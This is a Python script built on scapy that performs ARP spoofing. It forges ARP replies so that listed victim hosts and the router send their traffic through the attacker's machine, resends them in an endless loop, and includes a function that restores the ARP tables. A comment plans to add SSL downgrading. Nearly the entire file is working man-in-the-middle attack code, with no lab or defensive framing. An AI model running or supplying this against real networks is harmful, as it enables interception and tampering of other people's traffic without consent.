
#!/usr/bin/env python
import time
import sys
import scapy.all as scapy
#from scapy.all import *
import os

arp_looping = True #set this to false to stop the thread

# MAC address function which will return
# the mac_address of the provided ip address 
def get_mac(ip):
    # creating an ARP request to the ip address
    arp_request = scapy.ARP(pdst=ip)
    # setting the denstination MAC address to broadcast MAC
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # combining the ARP packet with the broadcast message
    arp_request_broadcast = broadcast / arp_request
     
    # return a list of MAC addresses with respective
    # MAC addresses and IP addresses.
    answ = scapy.srp(arp_request_broadcast, timeout=0.1, verbose=False, iface=IFACE)[0]
    if answ:
        # we choose the first MAC address and select
        # the MAC address using the field hwsrc
        return answ[0][1].hwsrc
    else:
        print("No ARP response for {}".format(ip))
        sys.exit(0)

 
  
def arp_spoof(target_ip, spoof_ip):
    """"Create and send ARP packet"""
    arp = scapy.ARP(op=2, pdst=target_ip,
                       hwdst=get_mac(target_ip), psrc=spoof_ip)
    ether = scapy.Ether(src=ATTACKER_MAC)
    packet = ether/arp
    scapy.sendp(packet, verbose=False, iface=IFACE)

def restore(victim_ip, source_ip):
    """"Restore arp table of victim"""
    victim_mac = get_mac(victim_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
                       psrc=source_ip, hwsrc=source_mac)
    scapy.sendp(packet, count=4, verbose=False, iface=IFACE)
 

def arp_main(attacker_addr, manual, router, input_iface, silent):
    # TOADD: 
    # - ssl downgrading
    if manual is None:
        print("No victim addresses given, quiting...")
        sys.exit()
    if router is None:
        print("No router address given, quiting...")
        sys.exit()
    victim_addresses = manual
    router_ip = router
    global IFACE
    global ATTACKER_IP
    global ATTACKER_MAC
    IFACE = input_iface
    ATTACKER_IP = attacker_addr[0]
    ATTACKER_MAC = attacker_addr[1]
    sent_packets_count = 0  # initializing the packet counter
    print(ATTACKER_IP, ATTACKER_MAC)

    while arp_looping:
        for victim_ip in victim_addresses:
            sent_packets_count += 2
            arp_spoof(victim_ip, router_ip)
            arp_spoof(router_ip, victim_ip)
            sys.stdout.flush()
            print("[+] Packets sent " + str(sent_packets_count) + "end=\r")
            sys.stdout.flush()
            time.sleep(2)